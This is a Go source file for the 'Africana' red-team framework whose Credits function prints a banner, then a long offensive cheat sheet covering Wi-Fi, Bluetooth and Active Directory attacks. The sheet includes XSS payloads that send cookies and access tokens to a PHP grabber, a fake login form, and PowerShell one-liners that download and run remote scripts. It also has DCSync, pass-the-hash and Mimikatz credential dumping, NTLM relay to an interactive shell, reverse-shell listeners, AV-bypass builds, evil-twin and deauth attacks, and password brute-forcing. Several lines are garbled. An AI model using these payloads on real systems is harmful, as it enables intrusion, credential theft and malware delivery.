package guides

import (
    "fmt"
    "bcolors"
)

func Credits() {
    fmt.Printf(`%s
                     _,._
                 __.'   _)
                <_,)'.-"a\
                  /' (    \
      _.-----..,-'   ('"--^
     //              |
    (|   ';      ,   |
      \   ;.----/  ,/
       ) // /   | |\ \
       \ \\'\   | |/ /      %sJesus Christ%s
        \ \\ \  | |\/  %sThe Lamb that was slain%s
         '" '"  '""         %sfor our sins.%s
    `, bcolors.BLUE, bcolors.GREEN + bcolors.GREEN, bcolors.BLUE, bcolors.GREEN, bcolors.BLUE, bcolors.GREEN, bcolors.ENDC)
    fmt.Printf(bcolors.YELLOW + `
            🛰️ Rojahs Montari Machine Pentesters For Exploration.` + bcolors.ENDC)
    fmt.Printf(bcolors.RED + `
* Africana Is a REDTEAM Penetration Testing Framework written in pure python3.
* It's aim Is to Make it Easier for Pen Testers during Penetration Testing.
* Africana also covers almost all Penetration Testing Attacks from Web Exploitation, WIFI attacks, Phishing, Generating Undetected Malware, Social Engineering Attacks, Cracking of Password and Internal Network Attacks.
* Free Anonymity Setup For Your System With Tor, Privoxy, Polipo & Squid.
    ` + bcolors.ENDC)

    fmt.Printf(bcolors.GREEN + `
nslookup
server 127.0.0.1
       172.10.10.3 
       127.0.0.2
dnsrecon -d 127.0.0.1 -t axfr
dnsrecon -d 127.0.0.1 -r 127.0.0.1/24

dig http://127.0.0.1 -t ns
dig -x 127.0.0.1
dig axfr 127.0.0.1 @n1.127.0.0.1 

nmap 127.0.0.1 --script=dns-zone-transfer -p 53 (zone transfer)
nmap -sn -Pn 127.0.0.1 --script hostmap-crtsh

amass enum -src -brute -min-for-recursive 2 -d 127.0.0.1
masscan -p1-65535 --rate=10000 -oG masscan 127.0.0.1

host -t ns  127.0.0.1
host -t mx 127.0.0.1 (mail servers)
host -l $ip ns1.$ip (zone transfer)
host -t ns 127.0.0.1 | cut -d " " -f 4 # (finding domain names)
theHarvester  -l 500 -b all -d  127.0.0.1

nmap --script-help ftp-anon
locate .nse | grep ftp
nmap -p 548 --script afp-brute
nmap --mtu ip port
uniscan -u 127.0.0.1 -qweds
searchsploit --exclude=dos -t apache 2.2.3
my-ip-neighbours.com locating virtual ips

sudo nmap --spoof-mac Cisco -sT -sV -Pn -vv -p- --script='vuln and safe' --reason --stats-every 5 127.0.0.1
sudo nmap --spoof-mac Cisco -sSCV -Pn -p- -T4 localhost

sudo nmap -sC -sV -Pn -A -oA nmap/IP --script=vuln -p- IP -vv
nmap -Pn --script smb-enum* -p139,445 IP | tee smb-enumeration
nmap -Pn --script smb-vuln* -p139,445 IP | tee smb-vulnerabilities

(Psalm 82:3–4)
responder -I eth0 -rdwv | tee responderHash.txt


#VPN EXPLOITATION
snmpwalk -c public -v2c  127.0.0.1
snmp-check  127.0.0.1

davtest  -url http:// 127.0.0.1
whatweb 127.0.0.1 -vv
whatweb -a 1 127.0.0.1 #Stealthy

#Gobuster
gobuster dir -u http://127.5.0.1/ -w /usr/share/wordlists/dirbuster/ -o 127.0.0.1.log

dirsearch -w /wordlists/ -u http:// / -o format.txt -e php,asp,net,jsp -t 50

whatweb -a 3 127.0.0.1 #Aggresive
cmsmap -f W/J/D/M -u a -p a https://wordpress.com

nikto -h  127.0.0.1
dirhunt  127.0.0.1
testssl.sh [--htmlfile] --openssl-timeout 5 127.0.0.1:443
sslscan <host:port>
sslyze --regular <ip:port>

cmsmap [-f W] -F -d  127.0.0.1
wpscan --force update -e --url  127.0.0.1
joomscan --ec -u  127.0.0.1
joomlavs.rb #https://github.com/rastating/joomlavs

whois -h 127.0.0.1 -p 443 "domain.tld"
whois -h 127.0.0.1 -p 43 "a') or 1=1#"

curl http:127.0.0.1?foo=bar

#Metasploit_Wmap
load wmap
wmap_sites -a http://172.16.194.172
wmap_sites -l
wmap_targets -t http://172.16.194.172/mutillidae/index.php
wmap_run -t
wmap_run -e
wmap_vulns -l
vulns 
+------------------------------------------------------------------------------+
|                        XSS ATTACKS  EXPLOITATION                             |
+------------------------------------------------------------------------------+

<script>document.location='http://localhost/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>

#Xsser
At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):

xsser -u 'https://127.0.0.1' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'(POST): xsser -u 'https://127.0.0.1login.php' -p 'username=bob&password=XSS&captcha=X1S'

Any extra attack(s) (Xsa, Xsr, Coo, Dorker, Crawler...):

#GET+Cookie 
xsser -u 'https://127.0.0.1' -g '/path/id.php?=2' --Coo(POST+XSA+XSR+Cookie): xsser -u 'https://127.0.0.1login.php' -p 'username=admin&password=admin' --Xsa --Xsr --Coo(Dorker): xsser -d 'news.php?id=' --Da(Crawler): xsser -u 'https://127.0.0.1' -c 100 --Cl

#GET+Manual 
xsser -u 'https://127.0.0.1' -g '/users/profile.php?user=XSS&salary=X1S' --payload='<script>alert(XSS);</script>'(POST+Manual): xsser -u 'https://127.0.0.1/login.asp' -p 'username=bob&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'

#GET+Cookie: 
xsser -u 'https://127.0.0.1' -g '/login.asp?user=bob&password=XSS' --Coo(POST+XSR+XSA): xsser -u 'https://127.0.0.1/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa

xsser -u 'http://127.8.0.1/vulnerabilities/xss_r/?name=XSS' --cookie='PHPSESSID=nr468p05tn70c9p38lmc2la9e0; security=low'
#SCRIPTS
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1>
<form>Username: <input type='text'>Password: <input type='password'></form>
<input value='submit' type='submit'>"
</script>

#grabber.phpXSS
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>

+------------------------------------------------------------------------------+
|                           SQLMAP EXPLOIT DBS                                 |
+------------------------------------------------------------------------------+
sqlmap --crawl=1 --tamper=between,luanginx,xforwardedfor --random-agent --batch --forms --threads=10 --level=5 --risk=3 --eta -u ""
sqlmap --proxy="http://127.0.0.1:8080" --dump-all -d "mysql://user:pass@ip/database" 

sqlmap -v 3 --risk=3 --level=5 --threads=10  -f  --time-sec 15 --tamper=between,luanginx,xforwardedfor --random-agent --proxy="http://localhost:8118" --batch  -u "" --cookie=""  --second-order --safe-url=http://10.10.10.10/ --mobile --safe-freq=1 
 
#ATSCAN
atscan --dork 'php?cid=intext:shopping' --level 100 --sql
atscan --dork 'php?cid=intext:shopping' --level 100 --wp

+------------------------------------------------------------------------------+
|                          Download file  & EXECUTE                            |
+------------------------------------------------------------------------------+
@echo off
start powershell.exe -nol -w 1 -nop -ep bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.202.128/shepherd.ps1')|iex"
(goto) 2>nul & del "%~f0"
powershell cd $Env:TMP;certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/r0jahsm0ntar1/neone/main/.bat" .bat
powershell cd $Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r0jahsm0ntar1/neone/main/.bat' -OutFile '.bat';powershell -W 1 -exec -File '.bat'

Invoke-WebRequest -Uri $url -OutFile $dest -Credential $credObject
impachet-smbserver -smb2support kali 'pwd'
\\127.0.0.1\kali\shell.exe
IWR -uri http://attackerip:80/Microsoft.exe -OutFile c:\\users\\Microsoft.exe
./smbserver.py Trinitysec $(pwd) -smb2support -user TrinityAdmn -password abc123

ps c:/>$pass = convertto-securestring 'abc123' -AsPlainText -Force
ps c:/>$pass
ps c:/>$cred = New-Object System.Management.Automation.PSCredential('TrinityAdmn', $pass)
ps c:/>$cred
ps c:/>New-PSDrive -Name TrinityAdmn -PSProvider FileSystem -Credential $cred -root \\127.0.0.1\Trinitysec (HDD)
ps c:/>net user TrinityAdmn Trinitysec /add /domain
ps c:/>net group "Exchange Windows Permissions"
ps c:/>net group "Exchange Windows Permissions" /add TrinityAdmn
ps c:/>net group "Exchange Windows Permissions"
ps c:/>cd TrinityAdmn:
ps c:/>.\Sharphound.exe -c all

#git PowerSploit -b dev
ps c:/>IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1/PowerView.ps1')
ps c:/>$pass = convertto-securestring 'abc123' -AsPlainText -Force
ps c:/>$cred = New-Object System.Management.Automation.PSCredential('HTB\TrinityAdmn', $pass)
ps c:/>Add-DomainObjectAcl -Credential $cred -127.0.0.1Identity "DC=htb,DC=local" -PrincipalIdentity TrinityAdmn -Rights DCSync
ps c:/>Get-ADDomain htb.local

secretsdump.py htb.local/TrinityAdmn:abcd123@172.10.10.3
psexec.py -hashes 32cdf72gf:32cdf72gf administrator@172.10.10.3
psexec.py -debug -k -no-pass htb.local/administrator@forest

+------------------------------------------------------------------------------+
|                              Acive Dir - Hacking                             |
+------------------------------------------------------------------------------+
                                                                     #Bloodhound

neo4j console
bloodhound
git clone https://github.com/BloodHoundAD/SharpHound3
  .\SharpHound.exe -c all -d active.htb --domaincontroller 127.0.0.1
  .\SharpHound.exe -c all -d active.htb -SearchForest
  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFi>
  .\SharpHound.exe -c all -d active.htb -SearchForest
  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
  .\SharpHound.exe -c all,GPOLocalGroup
  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
  .\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 127.0.0.1
  .\SharpHound.exe -c all,GPOLocalGroup --searchforest
  .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache 
    --encryptzip --collectallproperties --throttle 10000 --jitter 23

  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1

  # or remotely via BloodHound Python
  # https://github.com/fox-it/BloodHound.py
  pip3 install bloodhound
  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all

nmap -p 445 127.0.0.1 --script=smb-vuln-ms17-010 (eternalblue scan)
nmap -n -Pn -p 445 --script smb-vuln-ms17-010 127.0.0.1/24
windows/smb/ms17_010_eternalblue

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.200-210
set THREADS 11
run
hosts

git clone https://github.com/fox-it/mitm6.git && cd mitm6 && pip3 install .
mitm6 -d lab.local
ntlmrelayx.py -wh 127.0.0.1 -t smb://127.0.0.1/ -i
  # -wh: Server hosting WPAD file (Attacker’s IP)
  # -t: 127.0.0.1 (You cannot relay credentials to the same device that you’re spoofing)
  # -i: open an interactive shell
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access

enum4linux 127.0.0.1

smbmap -H 127.0.0.1 -u anonymous
smbmap -H 127.0.0.1 -u anonymous -r --depth 5
smbmap -H 127.0.0.1                # null session
smbmap -H 127.0.0.1 -R             # recursive listing
smbmap -H 127.0.0.1 -u invaliduser # guest smb session
smbmap -H 127.0.0.1 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

smbclient -L \\\\127.0.0.2\\
smbclient -L \\\\127.0.0.2\\admin$\
smbclient -I 127.0.0.1 -L ACTIVE -N -U ""
smbclient -U username //127.0.0.1/SYSVOL
smbclient //127.0.0.1/Share
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd '/path/to/go/'
smb: \> mget *

mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder

cme smb 127.0.0.1 --pass-pol
cme smb 127.0.0.1 --pass-pol -u '' -p ''
cme smb 127.0.0.1 -u userlist.out -p pwlist.out
cme smb 127.0.0.1 --pass-pol -u admin -p adc123 --shares
cme smb 127.0.0.1/24 -u Administrator -p '(mp64 Pass@wor?l?a)'

cme smb -L
cme smb -M name_module -o VAR=DATA
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
cme smb 127.0.0.1 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
cme smb 127.0.0.1 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
cme smb 127.0.0.1/24 -u user -p 'Password' --local-auth -M mimikatz
cme mimikatz --server http --server-port 80

+------------------------------------------------------------------------------+
|                         Wsman Port - Hacking                                 |
+------------------------------------------------------------------------------+
                                                                     #wsman port
evl-winrm.rb -u admin -p abc123 -i 127.0.0.1
grep 'def ' smbmap.py

rpcclient -U '' -P '' 127.0.0.1
rpcclient $>enumdomusers
          $>querygroup 0x47c
          $>queryuser 0x47b
Impackets
GetNPUsers.py -dc-ip 127.0.0.1 -request 'htt.local/' -format hashcat

#RDP Attacks
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://10.10.10.10
ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10

#389::Ldapsearch
ldapsearch -h 127.0.0.1
ldapserach -h 127.0.0.1 -x
                              -s base naming context
                                  -b "DC=htb,DC=local" > ldap-anonymous.out
cat ldap-anonymous.out | grep -i memberof
ldapsearch -h 127.0.0.1 -x -b "DC=htb,DC=local" '(objectClass=Person)'
    (objectClass=User) sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap

for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done

+------------------------------------------------------------------------------+
|                 Linux Storage, Data Recovery & Password attacks              |
+------------------------------------------------------------------------------+
                                                                  #Hdd Passwords

cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 luckshash 
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt

# Clear everything. Make sure sdX is your external hard drive (!!!)
dd if=/dev/zero of=/dev/sdX count=1 bs=16MB

sudo dd if=/dev/zero of=[path_to_external_hard_drive] bs=512 count=1
sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1
sudo dd if=/dev/zero of=[path_to_external_hard_drive] count=1

du -s file
$ sudo apt-get install foremost
$ fdisk -l
    Copy the name of your plugin disk or drive (127.0.0.1:- sda/sdb1)
$ foremost -t(file types) mp3,jpeg,pdf -q(quick scan) -i sda/sdb1(drive or disk) -o /root/Desktop/Output (Output folder)

 Follow The Simple Steps

    Select the saved password
    Right-click on it and select inspect
    The entire source code of the page is visible on the right
    In the source code change the type of attribute from Password to Text
    Now press enter the password will be unmasked and you can see it.


sudo dpkg --remove --force-remove-reinstreq package_name 
sudo dpkg -i --force-overwrite /var/cache/apt/archives/nodejs_0.10.28-1chl1~trusty1_amd64.deb

while true; do sourcesize=n destdir=/path/destinationdirectory/ copyprogress="$(export | du -sh $destdir | awk '{print $1}' | sed 's/[^0-9.]*//g' )" ; echo "scale=3 ; $copyprogress / $sourcesize * 100" | bc | xargs echo -n ; echo % completed ; sleep 10 ; done
sudo watch lsof -p 'pgrep -x cp'

$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.21.tar.xz
$ tar xvJf coreutils-8.21.tar.xz
$ cd coreutils-8.21/
$ wget http://zwicke.org/web/advcopy/advcpmv-0.5-8.21.patch
$ patch -p1 -i advcpmv-0.5-8.21.patch
$ ./configure
$ make

+------------------------------------------------------------------------------+
|                      Online Password Attacks.                                |
+------------------------------------------------------------------------------+
wfuzz -u http://127.0.0.1/index.php?action=authentication -d 'username=admin&password=FUZZ' -w .txt --hc 4003
medusa -h 127.0.0.1 -U user.txt -P /opt/wordlist/rockyou.txt -M smbnt,ssh,smb 127.0.0.1
hydra -l administrator -P /opt/wordlists/rockyou.txt -t 1 127.0.0.1 smb
ncrack -p 22 --user root -P ./rockyou.txt 10.10.10.0/24
john hashes.txt

#FTP Pass attack
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
wget -m ftp://anonymous:anonymous@1127.0.0.1 #Donwload all
wget -m --no-pasive ftp://anonymous:anonymous@127.0.0.1 #Download all
sudo nmap -sT -sV -Pn -vv -p 22 --script='ftp-* AND NOT ftp-brute*' --stats-every 10s 127.0.0.1

+------------------------------------------------------------------------------+
|                               Ftp Config                                     |
+------------------------------------------------------------------------------+
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

+------------------------------------------------------------------------------+
|                       Zip File with password                                 |
+------------------------------------------------------------------------------+
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
zip2john file.zip > zip.john
john zip.john

7z File With password
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z

#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
sudo apt-get -o Acquire::Check-Valid-Until=false  && sudo apt install
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john

+------------------------------------------------------------------------------+
|                             Ntlm Hashes                                      |
+------------------------------------------------------------------------------+
                                           #Format:USUARIO:ID:HASH_LM:HASH_NT:::

john --wordlist=/usr/share/wordlists/rockyou.txt --format=netlm file_NTLM.hashes
hashid (type of hash)
hashcat --127.0.0.1-hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot

#Http Hydra attack
hydra -L /users.txt -P /pass.lst domain.htb  http-post-form "/index.php:name=^USER^&pass=^PASS^&enter=Sign+in:password is incorrect" -V

#IMAP Attacks
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>

#Gathering Passwords
cewl 127.0.0.1 -m 5 -w words.txt

+------------------------------------------------------------------------------+
|                          Pasword Cracking                                    |
+------------------------------------------------------------------------------+
hashcat --127.0.0.1-hashes | grep 300
hashcat --127.0.0.1-hashes | grep -i krb
hashcat -m 18200 /hashes/svc-alfresco /usr/share/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule

hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes

+------------------------------------------------------------------------------+
|                     Networking, Mitm & Wifi Hacks                            |
+------------------------------------------------------------------------------+
                                                        Metasploit Wifi Attacker
root@kali:~# cat /etc/dhcp/dhcpd.conf
option domain-name-servers 10.0.0.1;

default-lease-time 60;
max-lease-time 72;

ddns-update-style none;

authoritative;

log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option domain-name-servers 10.0.0.1;
}

root@kali:~#airmon-ng start wlan0

root@kali:~# airbase-ng -P -C 30 -e "SAFARICOM FREE 5G INTERNET" -v wlan0
For information, no action required: Using gettimeofday() instead of /dev/rtc
22:52:25  Created tap interface at0
22:52:25  Trying to set MTU on at0 to 1500
22:52:25  Trying to set MTU on wlan0mon to 1800
22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.

ifconfig at0 up 10.0.0.1 netmask 255.255.255.0

root@kali:~# touch /var/lib/dhcp/dhcpd.leases
root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0

ps aux | grep [d]hcpd

airmon-ng start wlan0
airbase-ng -P -C 30 -e "SAFARICOM FREE 5G NETWORK 2022" -v wlan0
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0

+------------------------------------------------------------------------------+
|                            Airmon-ng                                         |
+------------------------------------------------------------------------------+
#simple hhtpserver
python -m SimpleHTTPServer 7000

ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis

aircrack-ng -w /pentest/wireless/aircrack-ng/test/password.lst capture01.cap
nano /etc/hostapd/hostapd.conf
dnschef --nameserver=1.1.1.#53 --fakeip= --interface=ip --fakedomain=google.com *.ike.com 
airbase-ng -e "Wife-Name" -a maccaddress -c1 wlan0

macchanger -mac=00:11:22:33:44:55 wlan0
iwconfig wlan0 mode monitor
airodump-ng -c ## -w capture -ivs wlan0
aireplay-ng -e wireless_network_name -a bssid_ap_victim -h 00:11:22:33:44:55 -fakeauth 10 wlan0
aireplay-ng -arpreplay -b bssid_ap_victim -h 00:11:22:33:44:55 wlan0
aircrack-ng -0 -n 64 capture-##.ivs
echo 1 > /proc/sys/net/ipv4/ip_forward

+------------------------------------------------------------------------------+
|                        Bettercap Wifie Hacks                                 |
+------------------------------------------------------------------------------+
ifconfig wlan0 down; macchanger -r wlan0; iwconfig wlan0 mode monitor; ifconfig wlan0 up
sudo bettercap --iface wlan0
set $ {bold}r0jahsm0ntar1 » {reset}
set wifi.txpower 30

sudo bettercap -iface eth0 -eval "set wifi.interface wlan0; wifi.recon on"
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on
set ticker.commands "clear; wifi.show"; wifi.recon on; ticker on
set wifi.show.sort bssid asc
set wifi.show.filter ^F4
wifi.show

wifi.recon.channel 1,2,3; wifi.recon on
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false
wifi.recon on; wifi.ap

wifi.recon on
wifi.show
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
wifi.assoc all
wifi.assoc all wifi.handshakes.file /home/redtem/handshakes
wifi.deauth all

hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
wifipumpkin3 --xpulp "set interface wlan0; set ssid nisha; set proxy noproxy; start"

wifi.recon.channel 1
wifi.deauth wifiemac

+------------------------------------------------------------------------------+
|                            Bluetooth Hacks                                   |
+------------------------------------------------------------------------------+
#We will use hcitool to find all the available BLE device present near the hos
hciconfig
hciconfig hci0 up
hciconfig hci0 class
hciconfig hci0 class 0x1c010c
hcitool lescan
sdptool browse --tree --l2cap 58:DB:15:03:19:36 #about given device
gatttool -I connect 88:C2:55:CA:E9:4A primary
char-desc 0x0010 0xffff #attr and end group handles  which in this case is 0x0010 0xffff
char-read-hnd 0x0012  #reading the handle with their handle value
ubertooth-btle -f -t 88:C2:55:CA:E9:4A -c smartbulb_dump.pcap  #follow connections for our 127.0.0.1 device
ifconfig wlan0 down;iwconfig wlan0 mode monitor;ifconfig wlan0 up; ifconfig; kismet --daemonize

+------------------------------------------------------------------------------+
|                          Kicking People Out                                  |
+------------------------------------------------------------------------------+
iptables -t nat -A POSTROUTING -O wlan0 -j MASQUAERADE
airplay-ng --deuth 0 -a 127.0.0.1 maccadress -c routermaccadress wlan0
sudo airmon-ng check kill && service NetworkManager restart && ip link set wlan0 down && iw dev wlan0 set type monitor && ip link set wlan0 up && iw wlan0 set txpower fixed 3737373737373 && service NetworkManager start
sudo wifite -i wlan0 --ignore-locks --keep-ivs -p 1337 -mac --random-mac -v -inf --bully --pmkid --dic /usr/share/wordlists/rockyou.txt --require-fakeauth --nodeauth --wps --pmkid-timeout 120

+------------------------------------------------------------------------------+
|                         Sniffing/ Spoofing                                   |
+------------------------------------------------------------------------------+
#CanTool
sh setup_vcan.sh
./icsim vcan 0
./controls vcan0
candump -i vcan0
cansniffer -c vcan0
--capture data via wiresharck

#Car Hacking
carwhisperer hci0 out.raw recordpresident.raw address

netdiscover -p
p0f -i lo -p -o /tmp/p0f.log
arp-scan --localnet
arp-scan --interface=eth0 192.168.0.0/24

#EtterCap
ettercap -T -Q -i lo -P dns_spoof -M ARP //rhost// //gateway//
ettercap -T -w dump -M ARP
ettercap -T -w -M -ARP

#Arpspoof
1) echo "1" > /proc/sys/net/ipv4/ip_forward
2) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
3) Run sslstrip with the command-line options you'd like (see above).
4) arpspoof -i eth0 -t <your127.0.0.1> <theRoutersIpAddress>

+------------------------------------------------------------------------------+
|                            Bettercap Tricks                                  |
+------------------------------------------------------------------------------+
bettercap -caplet beef-active.cap -eval "set arp.spoof.127.0.0.1.coom/ 127.0.0.1"

apt-get install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
responder -I eth0 -wrf
responder-MultiRelay -t 127.0.0.1 -u ALL

#Ferret/Hamster
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 80 -j REDIRECT --to-port 1000
sslstrip -f -a -k -l 1000 -w /root/out.txt
arpspoof -i eth0 {gateway} -t 127.0.0.1 gateway
ferret -i eth0
hamster
urlsnaf
driftnet
tshark -i 1 -V -w traffic.txt

sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets

netdiscover = ip neigh
nmap -n -sn -Pr 192.168.220.0/24

ip neigh flush all

+------------------------------------------------------------------------------+
|                             Beef-Xss                                         |
+------------------------------------------------------------------------------+
payload to /usr/share/beef-xss/extensions/demos/html
beef social engneering
fake flash
Costom url http://myip:3000/demos/payload.exe
image http://myip/adobe_flash_updating.jpg

#Metasploit
load msgrpc ServerHost=127.0.0.1 Pass=abc123
/usr/share/metasploit-framework/msfrpcd -f -S -P 0011.. -U msf -u /api -a 127.0.0.1 -p 55552 -v

nmap -v -sV 192.168.1.0/24 -oA subnet_1
search portscan
cat subnet_1.gnmap | grep 80/open | awk '{print $2}'

+------------------------------------------------------------------------------+
|                          AV Bypass and Compillinug                           |
+------------------------------------------------------------------------------+
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
i686-w64-mingw32-g++ openthesis.cpp -o .exe -lws2_32 -s -ffunction-sections -fdata-sections
 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe #.cpp
mcs -platform:x64 -unsafe Program.cs -win32icon:bing.ico -reference:System.Windows.Forms -out:trinity.exe #.cs

+------------------------------------------------------------------------------+
|                              Dll Exploit                                     |
+------------------------------------------------------------------------------+

#Dll exploits
rundll32 \\webdavserver\folder\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

#Koadic
use stager/js/rundll32_js
set SRVHOST 127.0.0.1
set ENDPOINT sales
run

#MSHTA Hacks
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 127.0.0.1
msf exploit(windows/misc/hta_server) > set lhost 127.0.0.1
msf exploit(windows/misc/hta_server) > exploit
mshta.exe //127.0.0.1:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit

#Listeners
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false

+------------------------------------------------------------------------------+
|                                  Mimikatz                                    |
+------------------------------------------------------------------------------+
meterpreter
load kiwi
kiwi_cmd '"dpapi::"'
sekurlsa::pth /user:Administrator /domain:EXADATA /ntlm:ea62008fa0d4b9b25540084c2be9f192 /run:cmd
sekurlsa::tickets
sekurlsa::logonpasswords
privilege::debug
token::elevate
lsadump::sam 
lsadump::secrets
kerberos::list
vault::list

+------------------------------------------------------------------------------+
|                                Privilage-escalation                          |
+------------------------------------------------------------------------------+
